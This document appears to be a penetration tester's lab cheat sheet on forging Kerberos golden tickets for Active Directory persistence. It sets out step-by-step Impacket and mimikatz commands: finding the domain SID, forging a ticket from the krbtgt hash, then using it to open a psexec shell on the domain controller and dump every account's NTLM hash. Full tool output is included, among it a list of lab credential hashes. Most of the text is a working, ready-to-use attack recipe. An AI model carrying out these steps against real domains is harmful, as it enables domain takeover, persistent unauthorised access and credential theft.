
This is a persistence technique, the requirements for it is that we must have the `krbtgt` hash, if we have that then we can have some good persistence

- Requirements
	- `krbtgt:nthash`  / `krbtgt:password`  , The most important requirement. if you dont have this then move on to another form of ticker
	- `Domain-SID` , the second piece of the puzzle
	- `User`, any existent user on the domain that exists. Administrator usually is the safest


### On linux (Preferred)

```
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0  <------------ First step always

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN $User   <-------------- this works most of the time

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN $User

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```

### On Windows


```
PS C:\Users\Administrator> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
marvel\administrator S-1-5-21-3115080475-3422209674-2867084633-500  <----------- OMIT THE 500
```


```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$UserYouWannaImpersonate /id:$UserId /ptt
```

```
misc::cmd
```



**NOTE TEST AS FCASTLE**
## linux

```
kali@kali ~> impacket-lookupsid -hashes 'aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33' 'MARVEL.local/Administrator@HYDRA-DC.MARVEL.local' 0
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at HYDRA-DC.MARVEL.local
[*] StringBinding ncacn_np:HYDRA-DC.MARVEL.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3115080475-3422209674-2867084633

```


```
kali@kali ~> impacket-ticketer -nthash bfe44203e5edf12ba925fd7510cc11bb -domain-sid S-1-5-21-3115080475-3422209674-2867084633 -domain MARVEL.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for MARVEL.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

```
kali@kali ~> export KRB5CCNAME=Administrator.ccache
```

### Now that its loaded, what are your options?

#### Psexec
```
kali@kali ~> impacket-psexec MARVEL.local/Administrator@HYDRA-DC.MARVEL.local -k -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on HYDRA-DC.MARVEL.local.....
[*] Found writable share ADMIN$
[*] Uploading file KNNLrEdr.exe
[*] Opening SVCManager on HYDRA-DC.MARVEL.local.....
[*] Creating service IUxN on HYDRA-DC.MARVEL.local.....
[*] Starting service IUxN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



#### secretsdump, again...
```
kali@kali ~> impacket-secretsdump -no-pass -k -dc-ip 192.168.176.129 MARVEL.local/Administrator@HYDRA-DC.MARVEL.local -just-dc-ntlm
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bfe44203e5edf12ba925fd7510cc11bb:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
ZFYTyjkzaS:2103:aad3b435b51404eeaad3b435b51404ee:14a024d509d1ef49cc7afd3fa975d8ab:::
eviluser:2105:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:000da82dd9ff3c760716ff02e5a926e5:::
PUNISHER$:2101:aad3b435b51404eeaad3b435b51404ee:44b68a86550cff9083755da2f4108ba3:::
SPIDERMAN$:2102:aad3b435b51404eeaad3b435b51404ee:73c579454e6ad41dd65eff5d110ef41a:::
[*] Cleaning up...
```

## Windows

```
PS C:\Users\Administrator> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
marvel\administrator S-1-5-21-3115080475-3422209674-2867084633-500  <----------- OMIT THE 500
```


```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /domain:MARVEL.local /sid:S-1-5-21-3115080475-3422209674-2867084633 /rc4:bfe44203e5edf12ba925fd7510cc11bb /user:randomuser /ptt
User      : randomuser
Domain    : MARVEL.local (MARVEL)
SID       : S-1-5-21-3115080475-3422209674-2867084633
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: bfe44203e5edf12ba925fd7510cc11bb - rc4_hmac_nt
Lifetime  : 4/7/2024 4:54:10 PM ; 4/5/2034 4:54:10 PM ; 4/5/2034 4:54:10 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'randomuser @ MARVEL.local' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6C1ECB800
```